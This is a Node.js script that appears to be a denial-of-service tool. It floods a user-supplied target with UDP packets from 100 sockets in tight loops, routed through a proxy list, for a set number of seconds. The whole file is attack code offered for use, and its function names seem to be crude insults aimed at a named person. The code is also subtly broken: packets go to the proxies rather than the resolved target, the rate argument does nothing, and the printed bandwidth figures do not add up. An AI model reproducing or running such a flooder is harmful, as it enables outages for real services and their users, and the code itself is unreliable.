const dgram = require("dgram");
const fs = require("fs");
const v8 = require("v8");
const dns = require("dns").promises;
const url = require("url");
const net = require("net");

v8.setFlagsFromString('--max_old_space_size=512');
v8.setFlagsFromString('--max_new_space_size=64');
v8.setFlagsFromString('--optimize_for_size');
v8.setFlagsFromString('--always_compact');
v8.setFlagsFromString('--expose_gc');
v8.setFlagsFromString('--max_semi_space_size=1');
v8.setFlagsFromString('--max_old_space_size=512');
global.gc && global.gc();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]) || 10,
    proxyFile: process.argv[5]
};

if (process.argv.length < 4) {
    console.log("node ditmetuanhai.js <target> <time> <rate> <proxyFile>");
    process.exit(1);
}

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(line => line.trim());
let proxyIndex = 0;
const getProxy = () => proxies[proxyIndex++ % proxies.length];

const PAYLOAD_SIZE = 16;
const PACKETS_PER_BURST = 10;

const payload = Buffer.allocUnsafe(PAYLOAD_SIZE);
payload.write("GET / HTTP/1.1\r\n", 0, "ascii");

const NUM_SOCKETS = 100;
const sockets = [];

for (let i = 0; i < NUM_SOCKETS; i++) {
    sockets.push(dgram.createSocket("udp4"));
}

const TARGET_BURST_INTERVAL = 0.00000025;
const BYTES_PER_BURST = PAYLOAD_SIZE * PACKETS_PER_BURST;
const BYTES_PER_SECOND = BYTES_PER_BURST * 4_000_000;
const MBITS_PER_SECOND = (BYTES_PER_SECOND * 8) / 1_000_000;

let targetIP = "";
let targetPort = 80;

const parseTarget = async (targetUrl) => {
    try {
        const parsedUrl = url.parse(targetUrl);
        if (!parsedUrl.hostname) {
            throw new Error("Invalid URL");
        }
        
        const hostname = parsedUrl.hostname;
        targetPort = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
        
        if (net.isIP(hostname)) {
            targetIP = hostname;
        } else {
            const resolved = await dns.lookup(hostname);
            targetIP = resolved.address;
        }
        
        console.log(`[>] Target: ${hostname} (${targetIP}:${targetPort})`);
    } catch (error) {
        console.log(`[!] Error parsing target: ${error.message}`);
        process.exit(1);
    }
};

const ditmetuanhai = () => {
    const socket = sockets[Math.floor(Math.random() * sockets.length)];
    const proxy = getProxy();
    const [proxyHost, proxyPort] = proxy.split(":");
    
    let lastBurstTime = process.hrtime.bigint();
    
    const tuanhaisucvat = () => {
        const now = process.hrtime.bigint();
        const elapsed = Number(now - lastBurstTime) / 1e9;
        
        if (elapsed >= TARGET_BURST_INTERVAL) {
            try {
                for (let i = 0; i < PACKETS_PER_BURST; i++) {
                    socket.send(payload, 0, payload.length, proxyPort, proxyHost);
                }
                lastBurstTime = now;
            } catch (e) {}
        }
        
        setImmediate(tuanhaisucvat);
    };
    
    tuanhaisucvat();
};

const tuanhaiaisucvat = () => {
    console.log(`[!] Starting UDP Flood...`);
    console.log(`[>] Target: ${args.target}`);
    console.log(`[>] Rate: ${args.rate}`);
    console.log(`[>] Proxies: ${proxies.length}`);
    console.log(`[>] Time: ${args.time}s`);
    console.log(`[>] Memory Limit: 1GB RAM`);
    console.log(`[>] Bandwidth Limit: 512Mbps`);
    console.log(`[>] Payload Size: ${PAYLOAD_SIZE} bytes`);
    console.log(`[>] Packets per Burst: ${PACKETS_PER_BURST}`);
    console.log(`[>] Target Burst Interval: ${TARGET_BURST_INTERVAL}ns`);
    console.log(`[>] Calculated Bandwidth: ${MBITS_PER_SECOND}Mbps`);
    
    const workersNeeded = Math.ceil(40_000_000 / (PACKETS_PER_BURST * 400_000));
    console.log(`[>] Creating ${workersNeeded} workers...`);
    
    for (let i = 0; i < workersNeeded; i++) {
        ditmetuanhai();
    }
    
    setInterval(() => {
        global.gc && global.gc();
    }, 1000);
};

const metuanhaibiditrachlon = async () => {
    await parseTarget(args.target);
    tuanhaiaisucvat();
    
    setTimeout(() => {
        console.log(`[!] Attack finished. Exiting...`);
        process.exit(0);
    }, args.time * 1000);
};

metuanhaibiditrachlon();

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
